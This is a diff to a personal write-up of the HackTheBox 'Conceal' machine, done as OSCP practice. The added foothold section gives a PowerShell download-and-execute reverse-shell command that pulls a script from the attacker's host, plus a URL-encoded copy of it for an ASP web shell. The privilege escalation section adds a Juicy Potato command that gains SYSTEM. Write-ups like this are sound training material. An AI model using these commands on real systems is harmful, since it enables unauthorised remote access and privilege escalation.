@@ -1,7 +1,7 @@
 # Conceal HelpThrough
 
 Name: Conceal
-Date:  1/11/2022
+Date:  13/11/2022
 Difficulty: Hard 
 Goals: OSCP Prep
 Learnt:
@@ -13,6 +13,9 @@ Learnt:
 - Setting up VPN servers
 - nmap does not SYN through a VPN
 - Strongswan is very picky
+- Simple asp shell is best shell
+- CLSID Keys
+- Batch files to do IEX powershell reverse shelling
 
 Having a bad hardware day... Therefore to keep the proverbial paddling  of a good life going ever on, Ippsec video on standby to learn why this box is so hard to enumerate and how I can encorporate more diligence when facing challenges that do not want to be found.
 
@@ -76,7 +79,9 @@ ifconfig tun0 mtu 1000
 
 ![](wowvpninyourvpn.png)
 
-At this point I thought I might as well pause the video and try hacking in from here for 30 minutes.
+At this point I thought I might as well pause the video and try hacking in from here for 30 minutes. 
+
+## Exploit
 
 FTP anonymous login with permissions to upload, but I cant print the directory or its contents. 
 ![](ftpupload.png)
@@ -88,12 +93,39 @@ No rcpclient, smb - retried uploading:
 
 ![](aspcmddoesnotwork.png)
 
-Tried others and with aspx and failed. The issue is that the configuration of the VPN require fragmentation to 
+Tried others and with aspx and failed. 
 
-## Exploit
+## Foothold 
 
-## Foothold
+I ended up using the very simple asp shell that is awesome from [0xdf](https://0xdf.gitlab.io/2019/05/18/htb-conceal.html)
+
+```powershell
+# The power of executing in memory powershell
+powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.109/Invoke-PowerShellTcp.ps1')"
+# Url encode
+cmd=%70%6f%77%65%72%73%68%65%6c%6c%20%22%49%45%58%28%4e%65%77%2d%4f%62%6a%65%63%74%20%4e%65%74%2e%57%65%62%43%6c%69%65%6e%74%29%2e%64%6f%77%6e%6c%6f%61%64%53%74%72%69%6e%67%28%27%68%74%74%70%3a%2f%2f%31%30%2e%31%30%2e%31%34%2e%31%30%39%2f%49%6e%76%6f%6b%65%2d%50%6f%77%65%72%53%68%65%6c%6c%54%63%70%2e%70%73%31%27%29%22
+```
+
+![](boxon.png)
+
+
 
 ## PrivEsc
 
-      
+Having recently compile every Potato exploit under the sun in the last 10 hours. It will be nice that Juicy Potato will work
+![1080](potatotime.png)
+
+From 0xDF I learnt about CLSIDs.
+[RTFM](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
+A CLSID is a globally unique identifier that identifies a COM class object. If your server or container allows linking to its embedded objects, you need to register a CLSID for each supported class of objects.
+
+`HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{CLSID}`
+
+Nothing wants to run.
+```
+.\jp.exe -t * -l 9001 -p <put a batch file that pull another powershell reverse shell into memory> -c '{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}'
+# -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
+```
+
+
+![](system.png)
